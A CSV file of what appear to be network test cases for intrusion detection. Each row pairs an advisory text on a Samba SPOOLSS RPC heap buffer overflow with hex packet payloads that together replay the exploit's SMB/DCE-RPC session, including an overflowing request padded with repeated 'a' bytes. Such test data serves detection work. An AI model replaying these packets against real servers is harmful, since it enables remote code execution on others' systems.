XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 FE FF ||SMBs||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CD ||'d||00 03 00 0C FF 00 00 00 FF FF 02 00 01 00 00 00 00 00 AC 00 00 00 00 00 ||\||00 00 80 C3 00 A1 81 A9 ||0||81 A6 A2 81 A3 04 81 A0 ||NTLMSSP||00 03 00 00 00 18 00 18 00 ||L||00 00 00 18 00 18 00 ||d||00 00 00 0C 00 0C 00 7C 00 00 00 08 00 08 00 88 00 00 00 0C 00 0C 00 ||@||00 00 00 10 00 10 00 90 00 00 00 15 02 08 ||`S||00 ||T||00 ||I||00 ||C||00 ||K||00 ||Y||00 FC ||W||C1 DF 1A 19 AC EA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||G'S||11 ||j||D9 0C B8 ||v||B7 B0 86 03 ||'||8A ||ys||D4 97 ||.1PF||DA ||D||00 ||H||00 ||C||00 ||P||00 ||6||00 ||4||00 ||t||00 ||e||00 ||s||00 ||t||00 ||uD||BA 7C EA A5 D2 CA C2 ||6||83 FF EC 81 F3 09 00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 ||V||FF ||SMBu||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CD ||'e||00 04 00 04 FF 00 00 00 00 00 01 00 ||+||00 00 ||\||00 ||\||00 ||1||00 ||7||00 ||2||00 ||.||00 ||1||00 ||6||00 ||.||00 ||8||00 ||.||00 ||6||00 ||4||00 ||\||00 ||I||00 ||P||00 ||C||00 ||$||00 00 00 ||IPC||00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 ||f||FF ||SMB||A2 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 CD ||'e||00 05 00 18 FF 00 00 00 00 10 00 00 00 00 00 00 00 00 00 9F 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00 00 01 00 00 00 ||@||00 00 00 02 00 00 00 03 13 00 00 ||\||00 ||s||00 ||p||00 ||o||00 ||o||00 ||l||00 ||s||00 ||s||00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 9A FF ||SMB%||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 CD ||'e||00 06 00 10 00 00 ||H||00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 ||R||00 ||H||00 ||R||00 02 00 ||&||00 FE ||qW||00 00 ||\||00 ||P||00 ||I||00 ||P||00 ||E||00 ||\||00 00 00 05 00 0B 03 10 00 00 00 ||H||00 00 00 00 00 00 00 B8 10 B8 10 00 00 00 00 01 00 00 00 00 00 01 00 ||xV4||12 ||4||12 CD AB EF 00 01 ||#Eg||89 AB 01 00 00 00 04 ||]||88 8A EB 1C C9 11 9F E8 08 00 ||+||10 ||H`||02 00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 01 AA FF ||SMB%||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 CD ||'e||00 07 00 10 00 00 ||X||01 00 00 B8 10 00 00 00 00 00 00 00 00 00 00 00 00 ||R||00 ||X||01 ||R||00 02 00 ||&||00 FE ||q}||01 00 ||\||00 ||P||00 ||I||00 ||P||00 ||E||00 ||\||00 00 00 05 00 00 03 10 00 00 00 ||X||01 00 00 00 07 00 00 00 ||n||00 00 00 00 ||A||00 00 00 00 00 D2 F0 A9 8D ||`||9E C1 ||E||AE 0D C5 B1 BD ||q||C7 ||S||00 04 00 00 00 00 00 00 ||@C||AA ||v||09 00 00 00 00 00 00 00 09 00 00 00 ||\||00 ||\||00 ||V||00 ||R||00 ||T||00 ||-||00 ||5||00 ||0||00 00 00 00 00 87 00 00 00 ||D||E0 0A 00 02 00 00 00 01 00 00 00 02 00 00 00 ||X||E0 0A 00 02 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 09 00 00 00 84 E0 0A 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 9C E0 0A 00 09 00 00 00 0A 00 0B 00 0D 00 03 00 14 00 15 00 10 00 17 00 16 00 00 00 ||P||00 00 00 ||aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 ||||FF ||SMBr||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CD ||'||00 00 01 00 11 07 00 03 ||2||00 01 00 04 ||A||00 00 00 00 01 00 B5 ||||00 00 FD F3 80 80 80 97 9D A8 1D A2 C7 01 F0 00 00 3A 00 ||dhcp64||00 00 00 00 00 00 00 00 00 00 ||`(||06 06 ||+||06 01 05 05 02 A0 1E ||0||1C A0 0E ||0||0C 06 0A ||+||06 01 04 01 82 ||7||02 02 0A A3 0A ||0||08 A0 06 1B 04 ||NONE
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 01 ||.||FF ||SMBs||16 00 00 C0 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CD ||'d||00 02 00 04 FF 00 00 00 00 00 C9 00 03 01 A1 81 C6 ||0||81 C3 A0 03 0A 01 01 A1 0C 06 0A ||+||06 01 04 01 82 ||7||02 02 0A A2 81 AD 04 81 AA ||NTLMSSP||00 02 00 00 00 0C 00 0C 00 ||0||00 00 00 15 02 8A ||`C||18 EB A2 ||#||1A AB ||>||00 00 00 00 00 00 00 00 ||n||00 ||n||00 ||<||00 00 00 ||D||00 ||H||00 ||C||00 ||P||00 ||6||00 ||4||00 02 00 0C 00 ||D||00 ||H||00 ||C||00 ||P||00 ||6||00 ||4||00 01 00 0C 00 ||D||00 ||H||00 ||C||00 ||P||00 ||6||00 ||4||00 04 00 1A 00 ||v||00 ||r||00 ||t||00 ||.||00 ||t||00 ||e||00 ||l||00 ||u||00 ||s||00 ||.||00 ||c||00 ||o||00 ||m||00 03 00 ||(||00 ||d||00 ||h||00 ||c||00 ||p||00 ||6||00 ||4||00 ||.||00 ||v||00 ||r||00 ||t||00 ||.||00 ||t||00 ||e||00 ||l||00 ||u||00 ||s||00 ||.||00 ||c||00 ||o||00 ||m||00 00 00 00 00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 || ||00 ||3||00 ||.||00 ||0||00 ||.||00 ||2||00 ||5||00 ||r||00 ||c||00 ||3||00 00 00 ||M||00 ||Y||00 ||G||00 ||R||00 ||O||00 ||U||00 ||P||00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 ||n||FF ||SMBs||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CD ||'e||00 03 00 04 FF 00 00 00 00 00 09 00 ||C||00 A1 07 ||0||05 A0 03 0A 01 00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 || ||00 ||3||00 ||.||00 ||0||00 ||.||00 ||2||00 ||5||00 ||r||00 ||c||00 ||3||00 00 00 ||M||00 ||Y||00 ||G||00 ||R||00 ||O||00 ||U||00 ||P||00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 ||0||FF ||SMBu||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 CD ||'e||00 04 00 03 FF 00 00 00 01 00 07 00 ||IPC||00 00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 ||g||FF ||SMB||A2 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 CD ||'e||00 05 00 22 FF 00 00 00 00 FE ||q||01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 FF 05 00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP,||00 00 00 7C FF ||SMB%||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 CD ||'e||00 06 00 0A 00 00 ||D||00 00 00 00 00 ||8||00 00 00 ||D||00 ||8||00 00 00 00 00 ||E||00 00 05 00 0C 03 10 00 00 00 ||D||00 00 00 00 00 00 00 B8 10 B8 10 F0 ||S||00 00 0E 00 ||\PIPE\spoolss||00 01 00 00 00 00 00 00 00 04 ||]||88 8A EB 1C C9 11 9F E8 08 00 ||+||10 ||H`||02 00 00 00||
FSC20070515-19_Samba_SPOOLSS_RPC_smb_io_notify_option_type_data_Request_Handling_Buffer_Overflow.xml,Samba SPOOLSS RPC smb_io_notify_option_type_data Request Handling Buffer Overflow,A heap-based buffer overflow vulnerability exists in the way Samba handles RPC messages. The vulnerability is due to a boundary error while performing specific RPC operations. Remote authenticated attackers can exploit this vulnerability by sending a specially crafted RPC request to the SPOOLSS RPC interface. Successful exploitation of this vulnerability allows attackers to execute arbitrary code on the vulnerable system in the context of the affected process.,MICROSOFT-DS,TCP," "
